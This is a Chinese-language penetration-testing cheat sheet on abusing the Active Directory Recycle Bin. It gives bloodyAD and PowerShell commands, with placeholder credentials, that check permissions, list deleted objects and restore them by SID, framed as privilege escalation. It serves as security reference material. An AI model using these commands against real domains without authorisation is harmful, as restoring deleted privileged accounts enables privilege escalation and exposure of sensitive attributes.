# Active Directory - 回收站

## 详情

* 已删除对象的默认保留时间为 180 天
* 回收站路径：`CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=example,DC=com`

在 PowerShell 中启用 Active Directory 回收站

```ps1
Enable-ADOptionalFeature -Identity 'CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=contoso,DC=com' -Scope ForestOrConfigurationSet -Target 'contoso.com'
```

## 已删除对象

**前提条件**：

* 对已删除对象容器具有 `LIST_CHILD` 权限
* OID `1.2.840.113556.1.4.2064`：显示已删除、已墓碑化和已回收的对象

**利用方法**：

* 列出权限

    ```ps1
    bloodyAD -u user -d domain -p 'Password123!' --host 10.10.10.10 get search -c 1.2.840.113556.1.4.2064 --resolve-sd --attr ntsecuritydescriptor --base 'CN=Deleted Objects,DC=domain,DC=local' --filter "(objectClass=container)"
    ```

* 检查所有前提条件中的权限

    ```ps1
    bloodyAD --host 10.10.10.10 -d domain -u user -p 'Password123!' get writable --include-del
    ```

* 使用 bloodyAD 列出已删除对象

    ```ps1
    bloodyAD -u user -d domain -p 'Password123!' --host 10.10.10.10 get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name
    ```

* 使用 PowerShell 列出已删除对象

    ```ps1
    Get-ADObject -Filter 'Name -Like "*User*"' -IncludeDeletedObjects 
    ```

## 恢复对象

**前提条件**：

* 对域对象具有 `Restore Tombstoned` 权限
* 对已删除对象具有 `Generic Write` 权限
* 对用于恢复的 OU 具有 `Create Child` 权限

默认情况下，只有域管理员能够列出和恢复已删除的对象。

恢复时某些对象会保留属性：

* 已删除对象保留其所有属性（包括敏感属性）
* 已墓碑化对象保留大多数重要属性

**利用方法**：

* 检查恢复权限

    ```ps1
    bloodyAD --host 10.10.10.10 -d domain -u user -p 'Password123!' get object 'DC=domain,DC=local' --attr ntsecuritydescriptor --resolve-sd                   
    
    bloodyAD -u user -d domain -p 'Password123!' --host 10.10.10.10 get search -c 1.2.840.113556.1.4.2064 --filter '(&(isDeleted=TRUE)(sAMAccountName=deleted-computer$))' --attr ntsecuritydescriptor --resolve-sd

    bloodyAD --host 10.10.10.10 -d domain -u user -p 'Password123!' get object 'CN=Users,DC=domain,DC=local' --attr ntsecuritydescriptor --resolve-sd
    ```

* 使用 sAMAccountName 或 objectSID 恢复对象

    ```ps1
    bloodyAD -u user -d domain -p 'Password123!' --host 10.10.10.10 set restore 'S-1-5-21-1394970401-3214794726-2504819329-1104'
    ```

## 参考资料

* [Have You Looked in the Trash? Unearthing Privilege Escalations from the Active Directory Recycle Bin - @CravateRouge - June 25, 2025](https://cravaterouge.com/articles/ad-bin/)
